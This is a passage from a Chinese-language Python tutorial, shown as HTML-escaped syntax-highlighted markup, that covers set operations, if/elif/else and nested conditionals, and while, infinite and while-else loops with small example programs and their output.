x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;banana&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cherry&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;google&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;apple&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
x&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;update&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;apple&#39;, &#39;cherry&#39;, &#39;banana&#39;, &#39;google&#39;, &#39;runoob&#39;}&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
{&#39;orange&#39;, &#39;apple&#39;, &#39;cherry&#39;, &#39;banana&#39;}
set()
{&#39;apple&#39;, &#39;cherry&#39;, &#39;banana&#39;}
{&#39;cherry&#39;, &#39;banana&#39;}
{&#39;cherry&#39;, &#39;banana&#39;}
{&#39;apple&#39;, &#39;cherry&#39;}
{&#39;apple&#39;}
{&#39;apple&#39;}
True
True
True
{&#39;cherry&#39;, &#39;banana&#39;}
{&#39;apple&#39;, &#39;cherry&#39;}
{&#39;cherry&#39;, &#39;banana&#39;, &#39;runoob&#39;, &#39;google&#39;}
{&#39;cherry&#39;, &#39;google&#39;, &#39;banana&#39;, &#39;runoob&#39;}
{&#39;cherry&#39;, &#39;banana&#39;, &#39;google&#39;, &#39;apple&#39;, &#39;runoob&#39;}
{&#39;cherry&#39;, &#39;banana&#39;, &#39;google&#39;, &#39;apple&#39;, &#39;runoob&#39;}
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h2 id=&#34;条件控制&#34;&gt;&lt;a href=&#34;#条件控制&#34; class=&#34;headerlink&#34; title=&#34;条件控制&#34;&gt;&lt;/a&gt;条件控制&lt;/h2&gt;&lt;h3 id=&#34;if语句&#34;&gt;&lt;a href=&#34;#if语句&#34; class=&#34;headerlink&#34; title=&#34;if语句&#34;&gt;&lt;/a&gt;if语句&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; condition_1&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    statement_block_1
&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; condition_2&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    statement_block_2
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    statement_block_3
    
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
如果 &#34;condition_1&#34; 为 True 将执行 &#34;statement_block_1&#34; 块语句
如果 &#34;condition_1&#34; 为False，将判断 &#34;condition_2&#34;
如果&#34;condition_2&#34; 为 True 将执行 &#34;statement_block_2&#34; 块语句
如果 &#34;condition_2&#34; 为False，将执行&#34;statement_block_3&#34;块语句
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;python每个条件后面都要使用冒号，接着是执行语句&lt;/li&gt;
&lt;li&gt;缩进相同的作为语句块，缩进为一个tab&lt;/li&gt;
&lt;li&gt;python中没有switch-case语句&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;请输入你家狗狗的年龄: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; age &lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;你是在逗我吧!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; age &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;相当于 14 岁的人。&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; age &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;相当于 22 岁的人。&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; age &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    human &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;22&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;age &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;对应人类年龄: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; human&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 退出提示&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;点击 enter 键退出&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
请输入你家狗狗的年龄: 3

对应人类年龄:  27
点击 enter 键退出

&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;if嵌套&#34;&gt;&lt;a href=&#34;#if嵌套&#34; class=&#34;headerlink&#34; title=&#34;if嵌套&#34;&gt;&lt;/a&gt;if嵌套&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; 表达式&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    语句
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; 表达式&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        语句
    &lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; 表达式&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        语句
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        语句
&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; 表达式&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    语句
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    语句

num &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;输入一个数字：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; num &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; num &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;你输入的数字可以整除 2 和 3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;你输入的数字可以整除 2，但不能整除 3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; num &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;你输入的数字可以整除 3，但不能整除 2&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;你输入的数字不能整除 2 和 3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;


&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
输入一个数字：4
你输入的数字可以整除 2，但不能整除 3
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;循环语句&#34;&gt;&lt;a href=&#34;#循环语句&#34; class=&#34;headerlink&#34; title=&#34;循环语句&#34;&gt;&lt;/a&gt;循环语句&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;python中循环有for和while&lt;/li&gt;
&lt;li&gt;缩进和冒号和条件控制相似&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;while循环&#34;&gt;&lt;a href=&#34;#while循环&#34; class=&#34;headerlink&#34; title=&#34;while循环&#34;&gt;&lt;/a&gt;while循环&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; 判断条件&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;condition&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;：
    执行语句&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;statements&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;……
    
n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;
i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token builtin&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; i
    i &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
55
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;无限循环&#34;&gt;&lt;a href=&#34;#无限循环&#34; class=&#34;headerlink&#34; title=&#34;无限循环&#34;&gt;&lt;/a&gt;无限循环&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;随便输入，输入0退出&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    var &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; var &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
        exit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# break&lt;/span&gt;
        
        
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;while-else&#34;&gt;&lt;a href=&#34;#while-else&#34; class=&#34;headerlink&#34; title=&#34;while-else&#34;&gt;&lt;/a&gt;while-else&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;expr&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;statement&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;additional_statement&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;
    
count &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; count &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
